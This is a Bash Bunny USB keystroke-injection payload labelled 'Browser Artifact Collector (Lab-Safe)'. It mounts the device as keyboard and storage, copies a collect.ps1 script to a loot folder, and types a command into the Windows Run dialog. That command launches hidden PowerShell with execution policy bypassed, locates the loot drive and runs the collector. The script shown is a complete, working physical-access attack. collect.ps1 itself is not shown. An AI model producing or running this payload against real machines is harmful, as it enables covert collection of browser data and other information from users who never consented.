#!/bin/bash
# Browser Artifact Collector Payload (Lab-Safe)

LED SETUP

# ---------------------------------------------
# Configure attack modes
# ---------------------------------------------
ATTACKMODE HID STORAGE    # HID to inject commands, STORAGE to mount loot
sleep 6                   # allow Windows to mount storage


# ---------------------------------------------
# Copy collect.ps1 to the Bunny storage
# ---------------------------------------------
cp /root/udisk/payloads/$SWITCH_POSITION/collect.ps1 /root/udisk/loot/collect.ps1


# ---------------------------------------------
# Launch PowerShell with admin-friendly behavior
# ---------------------------------------------
LED ATTACK

# Open Run dialog
QUACK GUI r
sleep 0.3

# Launch PowerShell hidden and run the script
QUACK STRING 'powershell -ExecutionPolicy Bypass -NoP -W Hidden -Command "$d=Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and (Test-Path (Join-Path $_.DeviceID \"loot\")) } | Select-Object -ExpandProperty DeviceID; & (Join-Path $d \"loot\\collect.ps1\")"'
QUACK ENTER


# ---------------------------------------------
# Allow script time to finish
# ---------------------------------------------
sleep 25

LED FINISH
